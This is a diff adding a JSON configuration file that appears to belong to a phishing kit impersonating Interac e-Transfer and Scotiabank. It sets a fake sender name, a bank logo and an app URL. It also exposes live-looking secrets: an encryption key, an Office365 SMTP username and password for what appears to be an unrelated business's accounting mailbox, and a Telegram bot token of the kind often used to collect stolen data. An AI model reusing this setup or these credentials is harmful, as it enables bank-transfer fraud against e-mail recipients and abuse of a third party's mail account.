@@ -1,0 +1,21 @@
+{
+  "general": {
+    "app_url": "https://ais-dev-ik6fjbgxydlm33vs27h2pz-106987767963.us-east1.run.app",
+    "encryption_key": "a3f91b6cd024e8c29b76a149efcc5d42",
+    "sender_name": "Interac e-Transfer",
+    "bank_name": "Scotiabank",
+    "bank_logo": "https://etransfer-content.interac.ca/en/logo_CA000002.png"
+  },
+  "smtp": {
+    "host": "smtp.office365.com",
+    "port": 587,
+    "secure": false,
+    "user": "accounting@abfarms.ca",
+    "pass": "Covid-1919!!",
+    "senderName": "Interac e-Transfer"
+  },
+  "telegram": {
+    "token": "8292408817:AAFn4kxPe334jCGwW_GzaI-8SGuLexjE5sI",
+    "chatId": ""
+  }
+}
